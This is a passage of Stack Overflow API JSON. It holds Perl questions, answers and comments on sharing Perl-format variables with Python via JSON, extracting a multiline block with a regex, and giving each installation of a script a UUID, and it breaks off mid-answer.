"https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1466560444, "post_id": 37957018, "comment_id": 63362449, "body": "You said you have a Perl program (<code>variables.txt</code>), and you said you don&#39;t want to use Perl to execute it. That&#39;s not going to happen. You&#39;re going to have to define the format of the file must more stringently. Until then, this question isn&#39;t answerable."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 6, "creation_date": 1466561200, "post_id": 37957018, "comment_id": 63362626, "body": "I&#39;d have the Perl program dump the variables in a JSON structure."}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466563136, "post_id": 37957018, "comment_id": 63363096, "body": "It may be possible to just remove the leading <code>$</code> and then just <code>eval</code> the result.  This is not a good solution for many reasons (you can google them), however, it would be better to follow the solution @ikegami suggests."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1466565687, "post_id": 37957018, "comment_id": 63363657, "body": "Well, for starters, that won&#39;t work if one of the lines is <code>$x = undef;</code> or even a simple dictionary (<code>$x = { k =&gt; &quot;v&quot; };</code>). Coming up with hacks is easy, but there&#39;s no way to evaluate which one might be appropriate"}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 1, "creation_date": 1466579745, "post_id": 37957018, "comment_id": 63369250, "body": "Agreed.  Just because it is possible (for some well defined input), doesn&#39;t mean its a good idea."}, {"owner": {"reputation": 47, "user_id": 6343062, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9e2e98dbf7ba6f1850eb9be862ba6e10?s=128&d=identicon&r=PG&f=1", "display_name": "Teddy", "link": "https://stackoverflow.com/users/6343062/teddy"}, "edited": false, "score": 0, "creation_date": 1466580507, "post_id": 37957018, "comment_id": 63369749, "body": "Thanks all for advice. It is not that i don&#39;t want to use perl. I do use perl as my main code, thats why the variable file is written in perl format (so that the main perl code will read and use those variables). But as part of main perl code, the sub-routine python code is executed (where that python code also has to use the same variable file). That&#39;s the reason I am trying to read perl format from python script. I will try to work out as you all suggested. Tks!"}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 3, "last_activity_date": 1466592677, "last_edit_date": 1466592677, "creation_date": 1466591133, "answer_id": 37965251, "question_id": 37957018, "link": "https://stackoverflow.com/questions/37957018/how-python-can-read-the-variables-written-in-perl-format/37965251#37965251", "title": "How python can read the variables written in perl format?", "body": "<p>I'd strongly suggest that you <em>don't</em> want to parse a variables file like this, and instead use a defined data transfer format.</p>\n\n<p>Looking at your source data - JSON looks a good bet. To make this easy, insert it into a namespace such as a hash:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Data::Dumper;\nuse JSON;\n\nmy %export = ( x =&gt; 1.2,\n               y =&gt; 90.2,\n               z =&gt; 4.2334,\n               img =&gt; [ 'version1.png', 'version2.png' ] ); \n\nprint Dumper \\%export;\n\nopen ( my $transfer, '&gt;', 'transfer.json' ) or die $!; \nprint {$transfer} to_json ( \\%export, {pretty =&gt; 1});\nclose ( $transfer ); \n</code></pre>\n\n<p>Which gives - in your file:</p>\n\n<pre><code>{\n   \"z\" : 4.2334,\n   \"x\" : 1.2,\n   \"img\" : [\n      \"version1.png\",\n      \"version2.png\"\n   ],\n   \"y\" : 90.2\n}\n</code></pre>\n\n<p>Which should be trivially readable in <em>any</em> language. (including Python). </p>\n"}, {"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 0, "last_activity_date": 1466593567, "last_edit_date": 1495540351, "creation_date": 1466593567, "answer_id": 37966190, "question_id": 37957018, "link": "https://stackoverflow.com/questions/37957018/how-python-can-read-the-variables-written-in-perl-format/37966190#37966190", "title": "How python can read the variables written in perl format?", "body": "<p>You can also shell out from Python to run the following Perl program, which will treat your <em>variables.txt</em> file as Perl code and wrap all the variables that are declared in it into a JSON object and print that.</p>\n\n<pre><code>perl -MJSON -e '\npackage Foo;\ndo \"variable.txt\";\npackage main;\nmy $export;\nforeach my $key (keys %{Foo::}) {\n    next if $key eq \"BEGIN\";\n    $export-&gt;{$key} = ${\"Foo::$key\"};\n}\nprint JSON::encode_json($export);'\n</code></pre>\n\n<p>So you would basically run this as a sub process or open it in Python, capture the output and JSON-decode it into a Python data structure.</p>\n\n<p>The JSON output would look like this.</p>\n\n<pre><code>{\n    'x': 1.2,\n    'y': 90.2,\n    'z': 4.2334,\n    'img1': 'version1.png',\n    'img2': 'version2.png'\n}\n</code></pre>\n\n<p>This works by using <a href=\"http://perldoc.perl.org/functions/do.html\" rel=\"nofollow noreferrer\"><code>do</code></a> in a separate <a href=\"http://perldoc.perl.org/functions/package.html\" rel=\"nofollow noreferrer\"><code>package</code></a> to include the variable definition file and treat it like Perl code (like PHP's <code>require</code>). A package is basically a namespace definition. It then switches back to the <em>main</em> package (that's the default in a Perl program) and read the symbol table of the other namespace. That contains all the variables we just read and defined. </p>\n\n<p>Because they are not declared with <code>my</code>, they are treated as package variables rather than lexicals. Because there is no <code>use strict</code>, the program doesn't complain about that.</p>\n\n<p>The symbol table might contain other stuff. When I tried this (without the <code>do</code>) it had a <code>BEGIN</code> block definition. Because I was lazy, I just parsed that one out explicitly. You could start looking at the reference types of those things in the symbol table, but I think it's not worth the effort. The <em>Foo</em> package shouldn't have anything else.</p>\n\n<p>It then assigns them as keys into a hash reference, and afterwards converts that to JSON and outputs it.</p>\n\n<hr>\n\n<p>I do believe that changing your data exchange format to JSON in general <a href=\"https://stackoverflow.com/a/37965251/1331451\">as Sobrique suggests</a> is the better way to go.</p>\n"}], "owner": {"reputation": 47, "user_id": 6343062, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9e2e98dbf7ba6f1850eb9be862ba6e10?s=128&d=identicon&r=PG&f=1", "display_name": "Teddy", "link": "https://stackoverflow.com/users/6343062/teddy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 487, "favorite_count": 0, "accepted_answer_id": 37965251, "answer_count": 2, "score": -2, "last_activity_date": 1466593567, "creation_date": 1466558056, "question_id": 37957018, "link": "https://stackoverflow.com/questions/37957018/how-python-can-read-the-variables-written-in-perl-format", "title": "How python can read the variables written in perl format?", "body": "<p>Hi my python code needs to read variable file (written in perl format) and recognize the variables to use in python script. My variable file (variable.txt) is written as:</p>\n\n<pre><code>$x=1.2;\n$y=90.2;\n$z=4.2334;\n$img1='version1.png';\n$img2='version2.png';\n</code></pre>\n\n<p>I would like my python code to read above file and recognize the variables. I use below code to read the files</p>\n\n<pre><code>fp=open(\"variables.txt\",\"r\")\nvar=fp.read()\nfp.close\nprint(var)\n</code></pre>\n\n<p>Above code will read all lines from variable.txt file but the python code did not recognize them as variables. What I mean is when I use those variables</p>\n\n<pre><code> e.g. A=x+y\n</code></pre>\n\n<p>I would like to get A=91.4, but the error shows  </p>\n\n<blockquote>\n  <p>\"name 'x' is not defined</p>\n</blockquote>\n\n<p>Also when I tried to open image by </p>\n\n<pre><code>img1=Image.open(\"%s\" %'img1') to open version1.png. \n</code></pre>\n\n<p>It did not work and shows</p>\n\n<blockquote>\n  <p>No such file or directory: 'img1'</p>\n</blockquote>\n\n<p>So, can anyone suggest how shall I command so that the variables in perl format to be read by python script? Tks</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 1, "creation_date": 1466550894, "post_id": 37955498, "comment_id": 63360308, "body": "<a href=\"http://perldoc.perl.org/perlretut.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/perlretut.html</a>"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466580979, "post_id": 37956920, "comment_id": 63370059, "body": "Ther&#39;s no need to use the ugly <code>[\\s\\S]</code> in Perl. Just <code>.</code> with the <code>&#47;s</code> modifier is fine. I also see no point in <code>^.*?</code> at the beginning in any language"}, {"owner": {"reputation": 13556, "user_id": 1400971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/825a9bf179b05302991fbbf9551355ac?s=128&d=identicon&r=PG", "display_name": "Ro Yo Mi", "link": "https://stackoverflow.com/users/1400971/ro-yo-mi"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466596720, "post_id": 37956920, "comment_id": 63380471, "body": "I&#39;m using <code>\\s\\S</code> because I&#39;m also using the <code>m</code> flag which allows me to use the <code>^</code> symbol to match the beginning of each line. If you remove one of the character classes then perl will not match new line characters. The point of having the <code>^.*?</code> is so that all lines are captured. not just from the word <code>noon</code> till the closing <code>}</code>. This offers the programmer the flexibility of having the text from all lines so they can do additional processing if desired."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466598003, "post_id": 37956920, "comment_id": 63381379, "body": "I don&#39;t follow. There&#39;s nothing wrong with using the<code>&#47;m</code> and <code>&#47;s</code> modifiers in combination"}, {"owner": {"reputation": 13556, "user_id": 1400971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/825a9bf179b05302991fbbf9551355ac?s=128&d=identicon&r=PG", "display_name": "Ro Yo Mi", "link": "https://stackoverflow.com/users/1400971/ro-yo-mi"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466601441, "post_id": 37956920, "comment_id": 63384168, "body": "When using the <code>m</code> flag, can you tell me how the <code>^</code> near the end of the expression would behave?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466602337, "post_id": 37956920, "comment_id": 63385037, "body": "<code>^</code> always matches at the beginning of the string. With the <code>&#47;m</code> modifier in place it also matches before any character that immediately follows a newline character"}, {"owner": {"reputation": 13556, "user_id": 1400971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/825a9bf179b05302991fbbf9551355ac?s=128&d=identicon&r=PG", "display_name": "Ro Yo Mi", "link": "https://stackoverflow.com/users/1400971/ro-yo-mi"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466603148, "post_id": 37956920, "comment_id": 63385792, "body": "It sounds like you&#39;re lamenting the aesthetics of a working expression. Where as <a href=\"https://regex101.com/r/cR7bQ5/1\" rel=\"nofollow noreferrer\">regex101.com/r/cR7bQ5/1</a> shows that changing the <code>[\\s\\S]</code> to <code>.</code> and using the <code>&#47;s</code> option does not yield the same results as <a href=\"https://regex101.com/r/vT9hM8/2\" rel=\"nofollow noreferrer\">regex101.com/r/vT9hM8/2</a>."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466603389, "post_id": 37956920, "comment_id": 63386046, "body": "That exactly what I&#39;m doing. There is a lot more to writing a good computer program than making &quot;something that works&quot;. It&#39;s also a <i>very</i> bad idea to have more than one quantifier with a non-greedy modifier, as it is highly likely that they combine to produce <i>catastrophic backtracking</i>"}, {"owner": {"reputation": 13556, "user_id": 1400971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/825a9bf179b05302991fbbf9551355ac?s=128&d=identicon&r=PG", "display_name": "Ro Yo Mi", "link": "https://stackoverflow.com/users/1400971/ro-yo-mi"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466604554, "post_id": 37956920, "comment_id": 63387160, "body": "Can you produce sample text that would cause the claimed catastrophic backtracking? I contend that making something that works trumps aesthetics everytime, unless it&#39;s art. In other words a beautiful chunk of code that does not do perform as desired is worse than one that works."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466609015, "post_id": 37956920, "comment_id": 63390758, "body": "I made the point mainly as a general one. (You should take a look at <a href=\"http://www.regular-expressions.info/catastrophic.html\" rel=\"nofollow noreferrer\"><i>Runaway Regular Expressions: Catastrophic Backtracking</i></a> and read the last section called <i>Quickly Matching a Complete HTML File</i>.) It doesn&#39;t apply so much here because you are using unmodified dots, so the first two non-greedy matches <code>.*?</code> can only ever be one line in length."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466609070, "post_id": 37956920, "comment_id": 63390798, "body": "In fact they are superfluous here and all you need is <code>.*</code> except for the last <code>.*?</code>. This works fine and I find it much more readable <code>&#47; ^ (?= .* &quot;noon&quot; ) .* \\{ (?s: .*? ) ^ \\} &#47;mgx</code>. The <code>?s</code> temporarily applies the <code>&#47;s</code> modifier for just the enclosing parentheses. The thing is that a nice-looking piece of code tends to be clearer, and clearer code reduces the chance of bugs. A messy chunk of code that <i>appears</i> to work may contain hidden bugs that you haven&#39;t found yet, and will be more difficult to find even after the symptoms have been encountered."}], "tags": [], "owner": {"reputation": 13556, "user_id": 1400971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/825a9bf179b05302991fbbf9551355ac?s=128&d=identicon&r=PG", "display_name": "Ro Yo Mi", "link": "https://stackoverflow.com/users/1400971/ro-yo-mi"}, "is_accepted": false, "score": 3, "last_activity_date": 1466557175, "creation_date": 1466557175, "answer_id": 37956920, "question_id": 37955498, "link": "https://stackoverflow.com/questions/37955498/extract-multiple-lines-string-after-a-variable-match-in-perl/37956920#37956920", "title": "Extract multiple lines string after a variable match in perl", "body": "<h1>Foreward</h1>\n\n<p>This type of pattern matching is fraught with edge cases. But if your input string is as basic as you're sample text then you should be ok.</p>\n\n<h1>Description</h1>\n\n<pre class=\"lang-regex prettyprint-override\"><code>^.*?\"noon\".*?\\{([\\s\\S]*?)^\\}\n</code></pre>\n\n<p><img src=\"https://www.debuggex.com/i/96BlBplsRPpURd6O.png\" alt=\"Regular expression visualization\"></p>\n\n<p>Note this expression uses the multiline option which causes the <code>^</code> to match the start of each line.</p>\n\n<h1>Example</h1>\n\n<p><strong>Live Demo</strong></p>\n\n<p><a href=\"https://regex101.com/r/vT9hM8/2\" rel=\"nofollow\">https://regex101.com/r/vT9hM8/2</a></p>\n\n<p><strong>Sample text</strong></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>if { $time == \"noon\"} {\n\nready for lunch.\n\nwhats for food? {asian, korean}\n\ngoing cafe or out?\n\n}\n</code></pre>\n\n<p><strong>Sample Matches</strong></p>\n\n<p>Capture group 1 will have:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>ready for lunch.\n\nwhats for food? {asian, korean}\n\ngoing cafe or out?\n</code></pre>\n\n<h1>Explanation</h1>\n\n<pre class=\"lang-none prettyprint-override\"><code>NODE                     EXPLANATION\n----------------------------------------------------------------------\n  ^                        the beginning of a \"line\"\n----------------------------------------------------------------------\n  .*?                      any character except \\n (0 or more times\n                           (matching the least amount possible))\n----------------------------------------------------------------------\n  \"noon\"                   '\"noon\"'\n----------------------------------------------------------------------\n  .*?                      any character except \\n (0 or more times\n                           (matching the least amount possible))\n----------------------------------------------------------------------\n  \\{                       '{'\n----------------------------------------------------------------------\n  (                        group and capture to \\1:\n----------------------------------------------------------------------\n    [\\s\\S]*?                 any character of: whitespace (\\n, \\r,\n                             \\t, \\f, and \" \"), non-whitespace (all\n                             but \\n, \\r, \\t, \\f, and \" \") (0 or more\n                             times (matching the least amount\n                             possible))\n----------------------------------------------------------------------\n  )                        end of \\1\n----------------------------------------------------------------------\n  ^                        the beginning of a \"line\"\n----------------------------------------------------------------------\n  \\}                       '}'\n----------------------------------------------------------------------\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1466609100, "creation_date": 1466609100, "answer_id": 37972321, "question_id": 37955498, "link": "https://stackoverflow.com/questions/37955498/extract-multiple-lines-string-after-a-variable-match-in-perl/37972321#37972321", "title": "Extract multiple lines string after a variable match in perl", "body": "<p>Your question is far from clear, which is why I've held back from posting an answer until now</p>\n\n<p>I wouldn't use a regex for this, except to check whether a line contained the string <code>\"noon\"</code>. There's also no need to read your file into an array</p>\n\n<p>This one-liner prints all lines starting with one containing <code>\"noon\"</code> and ending with one that starts with a closing brace <code>}</code></p>\n\n<p>If you want something different, like matching nested braces, then you must clarify your question</p>\n\n<pre><code>$ perl -ne '/\"noon\"/ .. /^\\}/ and print' exp.tcl\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>if { $time == \"noon\"} {\n\nready for lunch.\n\nwhats for food? {asian, korean}\n\ngoing cafe or out?\n\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5901017, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b06f7b473265eb8c25cb0c2fb1242b4?s=128&d=identicon&r=PG&f=1", "display_name": "johnagrees", "link": "https://stackoverflow.com/users/5901017/johnagrees"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 657, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1466609100, "creation_date": 1466547414, "last_edit_date": 1466550720, "question_id": 37955498, "link": "https://stackoverflow.com/questions/37955498/extract-multiple-lines-string-after-a-variable-match-in-perl", "title": "Extract multiple lines string after a variable match in perl", "body": "<p>I want to extract the multiple lines in curly braces after matching a string \"noon\"</p>\n\n<blockquote>\n  <p>file : exp.tcl</p>\n</blockquote>\n\n<pre><code>if { $time == \"noon\"} {\n\nready for lunch.\n\nwhats for food? {asian, korean}\n\ngoing cafe or out?\n\n}\n</code></pre>\n\n<p>I stored the file in an array and reading it with foreach loop to perform other regex function. I am trying with <code>extract_multiple</code> but unable to get return string. </p>\n"}, {"tags": ["perl", "mechanize", "uuid", "plex"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1466545052, "post_id": 37954976, "comment_id": 63358352, "body": "Do you need a different ID for every run, or every installation? Either way, use a module like <a href=\"https://metacpan.org/pod/Data::GUID\" rel=\"nofollow noreferrer\">Data::GUID</a>."}, {"owner": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466546284, "post_id": 37954976, "comment_id": 63358824, "body": "Per installation. Not per run."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466566601, "post_id": 37954976, "comment_id": 63363870, "body": "Is this a Linux or Windows question, or could it be a mixture?"}, {"owner": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "edited": false, "score": 0, "creation_date": 1466609991, "post_id": 37954976, "comment_id": 63391457, "body": "It&#39;s a perl question. If I make this script available to others... I have no clue what platform they may run it from."}], "answers": [{"comments": [{"owner": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "edited": false, "score": 0, "creation_date": 1466546236, "post_id": 37955103, "comment_id": 63358805, "body": "This doesn&#39;t accomplish the task. Each time it runs, it will get a new value. It needs to be the same value for any given user, every time they run it. But it needs to be a different value for every user. Low-overhead, single file script."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "edited": false, "score": 1, "creation_date": 1466546346, "post_id": 37955103, "comment_id": 63358853, "body": "@JohnO Generate the ID as part of the installation process."}, {"owner": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "edited": false, "score": 0, "creation_date": 1466552060, "post_id": 37955103, "comment_id": 63360625, "body": "It&#39;s not anything that requires an &quot;installation process&quot;. It&#39;s a single-file script fewer than 150 lines of code. Half of that comments and whitespace. That&#39;s overkill."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "edited": false, "score": 0, "creation_date": 1466553765, "post_id": 37955103, "comment_id": 63361016, "body": "@JohnO Then generate it the first time the script is run and store it, either in the script itself or in a separate file (my preference)."}, {"owner": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "edited": false, "score": 0, "creation_date": 1466554730, "post_id": 37955103, "comment_id": 63361265, "body": "Generating it the first time is easy. Storing it... I was asking how to do that creatively. Even if impractical, it was an interesting idea but I&#39;m not sure how to do it."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "edited": false, "score": 0, "creation_date": 1466555193, "post_id": 37955103, "comment_id": 63361358, "body": "@JohnO The easiest way would be: if ID file exists, read ID from file; if not, generate new ID and write to file."}], "tags": [], "owner": {"reputation": 118519, "user_id": 244297, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/0e726125e86b084ffec695e845b360b7?s=128&d=identicon&r=PG", "display_name": "Eugene Yarmash", "link": "https://stackoverflow.com/users/244297/eugene-yarmash"}, "is_accepted": false, "score": 0, "last_activity_date": 1466547020, "last_edit_date": 1495540516, "creation_date": 1466545499, "answer_id": 37955103, "question_id": 37954976, "link": "https://stackoverflow.com/questions/37954976/how-can-i-make-each-instance-of-a-perl-script-have-its-own-unique-id/37955103#37955103", "title": "How can I make each instance of a perl script have its own unique id?", "body": "<p>You could use <a href=\"http://search.cpan.org/perldoc?UUID%3A%3ATiny\" rel=\"nofollow noreferrer\"><code>UUID::Tiny</code></a> to generate a <a href=\"https://en.wikipedia.org/wiki/Universally_unique_identifier#Version_4_.28random.29\" rel=\"nofollow noreferrer\">random UUID</a>:</p>\n\n<pre><code>use UUID::Tiny;   \nmy $uuid = create_UUID(UUID_V4);\n</code></pre>\n\n<p>To preserve the UUID between invocations, you'll have to modify the script itself. The answers in this <a href=\"https://stackoverflow.com/questions/3562586/can-a-perl-script-modify-itself\">thread</a> might be helpful.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1466570600, "last_edit_date": 1495535348, "creation_date": 1466570051, "answer_id": 37958632, "question_id": 37954976, "link": "https://stackoverflow.com/questions/37954976/how-can-i-make-each-instance-of-a-perl-script-have-its-own-unique-id/37958632#37958632", "title": "How can I make each instance of a perl script have its own unique id?", "body": "\n\n<h3>Update</h3>\n\n<p>You say in the comments that you want a different unique ID <a href=\"https://stackoverflow.com/questions/37954976/how-can-i-make-each-instance-of-a-perl-script-have-its-own-unique-id/37958632#comment63358824_37954976\"><em>\"per installation\"</em></a>, but you also say that <a 